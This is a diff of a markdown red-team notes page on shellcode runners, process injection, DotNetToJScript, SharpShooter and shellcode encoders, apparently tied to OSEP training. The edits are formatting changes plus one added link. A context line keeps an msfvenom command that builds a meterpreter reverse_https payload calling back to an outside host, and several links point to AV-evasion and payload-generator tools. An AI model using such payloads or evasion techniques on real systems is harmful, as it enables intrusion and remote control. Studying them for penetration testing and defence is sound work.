@@ -119,7 +119,7 @@ $thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)
 
 ### Reflectively using DelegateType (in Memory)
 
-* [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Shellcode%20Process%20Injector.ps1](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Shellcode%20Process%20Injector.ps1)
+- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Shellcode%20Process%20Injector.ps1](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Shellcode%20Process%20Injector.ps1)
 
 What's going on here:
 
@@ -186,7 +186,7 @@ In order to run x64 shellcode from a 32-bit application (e.g., MS Word), you may
 
 ### C\# DLL to Jscript
 
-* [https://github.com/tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
+- [https://github.com/tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
 
 {% code title="TestClass.cs" %}
 ```csharp
@@ -235,7 +235,7 @@ Cmd > .\DotNetToJScript.exe .\ExampleAssembly.dll --lang=Jscript --ver=v4 -o dem
 
 #### SharpShooter
 
-* [https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)
+- [https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 -f raw -o met.bin
@@ -254,8 +254,9 @@ This tool can efficiently be used with **HTML Smuggling** technique.
 
 ### C\# DLL with PowerShell Cradle (in Memory)
 
-* [https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html](https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html)
-* [https://github.com/smokeme/payloadGenerator](https://github.com/smokeme/payloadGenerator)
+- [https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html](https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html)
+- [https://github.com/smokeme/payloadGenerator](https://github.com/smokeme/payloadGenerator)
+- [https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/](https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/)
 
 {% code title="ShellcodeRunner.cs" %}
 ```csharp
@@ -343,9 +344,9 @@ $a = [ShellcodeRunner.Program]::Run()
 
 ## Shellcode Encoders/Encryptors
 
-* [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/ROT%20Shellcode%20Encoder/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/ROT%20Shellcode%20Encoder/Program.cs)
-* [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs)
-* [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter.py](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter.py)
+- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/ROT%20Shellcode%20Encoder/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/ROT%20Shellcode%20Encoder/Program.cs)
+- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs)
+- [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter.py](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter.py)
 
 Shellcode XOR-encrypt helper for VBA:
 
